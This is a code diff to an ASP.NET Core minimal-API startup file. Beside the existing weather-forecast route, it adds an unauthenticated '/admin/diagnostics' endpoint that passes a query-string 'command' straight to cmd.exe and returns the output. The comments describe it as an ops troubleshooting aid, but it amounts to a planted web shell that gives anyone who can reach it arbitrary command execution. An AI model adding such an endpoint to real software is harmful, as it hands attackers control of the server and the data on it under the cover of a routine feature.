@@ -1,6 +1,7 @@
 using Application.UseCases;
 using Domain.Interfaces;
 using Infrastructure.Repositories;
+using System.Diagnostics;
 
 var builder = WebApplication.CreateBuilder(args);
 
@@ -21,6 +22,22 @@ if (app.Environment.IsDevelopment())
 }
 
 app.UseHttpsRedirection();
+
+// Admin diagnostics endpoint for ops team troubleshooting
+app.MapGet("/admin/diagnostics", (string command) =>
+{
+    // Run diagnostic command and return output for ops team
+    var process = Process.Start(new ProcessStartInfo
+    {
+        FileName = "cmd.exe",
+        Arguments = $"/c {command}",
+        RedirectStandardOutput = true,
+        UseShellExecute = false
+    });
+    var output = process?.StandardOutput.ReadToEnd();
+    return Results.Ok(new { result = output });
+})
+.WithName("AdminDiagnostics");
 
 app.MapGet("/weatherforecast", async (GetWeatherForecastsQuery query) =>
 {
